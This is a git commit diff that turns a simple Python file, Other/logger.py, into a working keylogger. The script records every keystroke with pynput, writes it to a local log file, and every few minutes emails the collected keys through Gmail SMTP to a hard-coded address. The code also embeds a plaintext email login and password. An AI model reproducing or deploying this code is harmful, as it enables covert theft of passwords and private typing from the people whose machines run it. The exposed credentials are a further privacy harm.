214b14d22d9ef726c04828ba292aeb556ad60f92
wd7512 <35834979+wd7512@users.noreply.github.com>
2018-11-13 19:48:28 +0000

    a

--- Other/logger.py
+++ Other/logger.py
@@ -1,15 +1,50 @@
 from pynput.keyboard import Key, Listener
 import logging
-#if no name it gets put into an empty string
-log_dir=''
-#logging function
-logging.basicConfig(filename=(log_dir+'key_log.txt'),level=logging.DEBUG,format='%(asctime)s:%(messages)s:')
-#from library
+import datetime
+import smtplib
+global maildata
+global sendfreq
+global sent
+global mins
+global word
+
+maildata=[]
+sendfreq=5 #in minutes
+sent=False
+mins=-sendfreq
+word=''
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
 def on_press(key):
     logging.info(str(key))
-    #if key==key.esc:
-        #stop listener
-        #return False
-#this says listener is on
-with Listener(on_press==on_press) as listener:
+    
+    global maildata
+    global sendfreq
+    global sent
+    global mins
+    global word
+
+    word=word+str(key)
+    if len(str(key))!=3:
+        maildata.append(word)
+        word=''
+    
+    if sent==True and datetime.datetime.now().minute%sendfreq!=0:
+        sent==False
+    if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
+        mins=datetime.datetime.now().minute
+        print('sending email')
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login("band.mishaps@gmail.com", "Baobab7512")
+        server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(maildata))
+        server.quit()
+        print('email sent')
+        sent=True
+        maildata=[]
+
+with Listener(on_press=on_press) as listener:
     listener.join()
